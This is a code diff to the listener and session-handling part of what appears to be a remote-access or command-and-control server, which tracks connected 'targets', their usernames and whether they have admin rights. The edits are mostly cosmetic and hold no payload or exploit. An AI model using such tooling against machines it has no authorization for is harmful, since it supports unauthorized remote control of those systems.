@@ -79,7 +79,7 @@ def target_comm(target_id):
 
 def listener_handler():
     """ Hosts the listener for the socket, binds the socket, accepts
-    traffic, and then redirects that traffic.
+        traffic, and then redirects that traffic.
     """
 
     # 1 Accept Connection
@@ -91,7 +91,7 @@ def listener_handler():
 
 def comm_handler():
     """ Directs traffic to where it needs to go and ensures that it is
-    receiving it where needed.
+        receiving it where needed.
     """
     while True:
         # ! WHY IS THIS NOT WORKING?
@@ -103,17 +103,20 @@ def comm_handler():
 
             # get username of the target
             username = remote_target.recv(BUFFER).decode()
+            print(username)
 
             # check if current target is an admin account
             admin = remote_target.recv(BUFFER).decode()
             if admin == 1:
-                # if target is Windows
-                is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
-            elif  username == 'root':
-                # else if target is Linux
+                # if target is Windows (UID = 1)
                 is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
             else:
-                is_admin = bcolors.FAIL + 'No' + bcolors.ENDC
+                if  username == 'root':
+                    # could be a linux machine
+                    # else if target is Linux (UID = 0)
+                    is_admin = bcolors.OKGREEN + 'Yes' + bcolors.ENDC
+                else:
+                    is_admin = bcolors.FAIL + 'No' + bcolors.ENDC
 
             # get the time when the target client connects
             curr_time = time.strftime("%H:%M:%S", time.localtime())
@@ -157,12 +160,12 @@ if __name__ == '__main__':
                     print("")
                     sessions_table = PrettyTable()
                     sessions_table.field_names = [
-                        bcolors.OKCYAN + bcolors.BOLD + 'Session' + bcolors.ENDC,
-                        bcolors.OKCYAN + bcolors.BOLD + 'Status' + bcolors.ENDC,
-                        bcolors.OKCYAN + bcolors.BOLD + 'Username' + bcolors.ENDC,
-                        bcolors.OKCYAN + bcolors.BOLD + 'Admin' + bcolors.ENDC,
-                        bcolors.OKCYAN + bcolors.BOLD + 'Target' + bcolors.ENDC,
-                        bcolors.OKCYAN + bcolors.BOLD + 'Connection Time' + bcolors.ENDC
+                        bcolors.BOLD + 'Session' + bcolors.ENDC,
+                        bcolors.BOLD + 'Status' + bcolors.ENDC,
+                        bcolors.BOLD + 'Username' + bcolors.ENDC,
+                        bcolors.BOLD + 'Admin' + bcolors.ENDC,
+                        bcolors.BOLD + 'Target' + bcolors.ENDC,
+                        bcolors.BOLD + 'Connection Time' + bcolors.ENDC
                     ]
 
                     sessions_table.padding_width = 3
